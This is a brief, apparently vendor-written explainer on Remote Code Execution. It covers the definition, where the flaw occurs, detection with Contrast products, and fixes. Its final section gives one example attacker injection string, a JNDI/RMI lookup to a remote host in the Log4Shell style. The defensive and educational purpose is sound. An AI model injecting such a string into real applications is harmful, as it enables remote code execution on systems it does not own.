# Remote Code Execution (RCE)

## What is Remote Code Execution (RCE)

Remote Code Execution occurs when a remote attacker can cause your application to reach out to another source to obtain instructions, often either a script or binary.

RCE is a common name that overlaps with similar vulnerability categories like [deserialization](deserialization.md)

## When can RCE affect my application

Remote Code Execution is commonly found in utilities where software engages remote code or allows items to be loaded. Common occurrences are often around Remote Method Invocation or dynamic loading utilities.

## How do I know if/where my application has an RCE vulnerability

Contrast Assess monitors execution and can detect Remote Code Execution vulnerabilities.

Contrast Protect can defend Remote Code Execution vulnerabilities.

## How do I fix RCE

Developers should avoid frameworks that dynamically load remote code. Operators should harden an environment, preventing it from reaching out to remote sources outside its network or VPC.

## How do people attack RCE flaws
Attackers often inject Strings into applications that can be interpreted as something to load and run.

```
${jndi:rmi://192.168.2.106:1099/vccvhr}
```